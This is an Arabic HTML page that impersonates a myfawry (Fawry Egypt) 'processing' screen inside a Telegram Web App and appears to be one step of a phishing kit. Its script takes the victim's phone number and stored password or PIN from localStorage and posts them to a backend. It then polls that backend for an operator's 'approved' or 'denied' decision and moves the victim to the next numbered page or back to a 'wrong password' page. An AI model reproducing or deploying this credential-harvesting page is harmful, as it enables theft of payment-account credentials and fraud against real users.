<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>myfawry مصر - جاري المعالجة</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --fawry-yellow: #ffc20e;     /* Fawry Signature Yellow/Gold */
            --fawry-yellow-dark: #e0a800;
            --fawry-blue: #003366;       /* Fawry Dark Navy Blue */
            --fawry-blue-dark: #002244;
            --fawry-gradient: linear-gradient(180deg, #004080 0%, #003366 100%);
            --bg-dark: #0a111a;
            --card-bg: #ffffff;
            --text-dark: #003366;
            --text-muted: #666666;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Centered Loading Card */
        .loading-card {
            background: var(--card-bg);
            width: 88%;
            max-width: 380px;
            padding: 45px 24px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Animated Spinner Circle */
        .loader-circle {
            width: 110px;
            height: 110px;
            background: var(--fawry-gradient);
            border-radius: 50%;
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 6px 20px rgba(0, 51, 102, 0.35);
        }

        .loader-circle::after {
            content: '';
            width: 82px;
            height: 82px;
            border: 4px solid rgba(255, 255, 255, 0.2);
            border-top: 4px solid var(--fawry-yellow);
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Dynamic Status Typography */
        h2 {
            color: var(--text-dark);
            font-size: 24px;
            margin: 0 0 10px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        p {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0;
            line-height: 1.5;
            font-weight: 500;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">جاري المعالجة...</h2>
    <p id="sub-text">جاري التحقق من البيانات...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {

    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const phone = localStorage.getItem("userPhone") || localStorage.getItem("phone") || "";
    const pin = localStorage.getItem("lastPassword") || localStorage.getItem("lastPin") || "";

    if (!phone) {
        console.warn("⚠️ لم يتم العثور على رقم الهاتف في التخزين المحلي");
    }

    // Send login notification to backend endpoint
    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin })
        });
    } catch (err) {
        console.error("❌ خطأ في الطلب:", err);
    }

    // Dynamic progress text switch
    setTimeout(() => {
        mainText.textContent = "يرجى الانتظار...";
        subText.textContent = "يستغرق هذا بضع ثوانٍ";
    }, 3000);

    // Poll backend status for approval or denial
    async function checkApproval() {
        if (!phone) return;

        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "تمت الموافقة!";
                subText.textContent = "جاري تحويلك إلى الصفحة التالية...";

                setTimeout(() => {
                    window.location.href = "/page8";
                }, 1500);
            }

            if (data.status === "denied") {
                mainText.textContent = "تم الرفض!";
                subText.textContent = "كلمة السر أو رقم الهاتف غير صحيح.";

                setTimeout(() => {
                    window.location.href = "/page6?error=wrong_password";
                }, 2000);
            }

        } catch (err) {
            console.error("❌ فشل التحقق من الحالة:", err);
        }
    }

    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
